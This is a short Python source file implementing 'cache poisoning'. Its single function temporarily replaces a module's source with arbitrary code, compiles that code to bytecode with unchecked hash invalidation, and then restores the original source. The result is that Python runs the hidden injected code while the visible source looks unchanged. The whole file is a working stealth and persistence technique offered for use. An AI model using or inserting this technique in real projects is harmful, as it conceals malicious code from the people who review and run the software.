""" 
Implements cache poisoning. 
""" 


from os import rename 
from random import random 
from py_compile import compile 


def invalidate(path: str, code: str): 
    """ 
    Cache poisons a Python module located at `path` such 
    that it executes `code` instead of its own source code. 
    
    Parameters 
    ---------- 

    path: str 

        The path of the Python module to poison. Usually 
        relative paths are preferred. 

    code: str 

        The code which should be executed when the poisoned 
        module is imported. 
    """ 

    # Create a temporary file... 

    temporary = str(random()) 

    # Move the module into the temporary file... 

    rename(path, temporary) 

    # Create a poisoned module... 

    open(path, "w").write(code) 

    # Compile it with unchecked invalidation... 

    compile(path, invalidation_mode=3) 

    # Move the original module back... 

    rename(temporary, path)
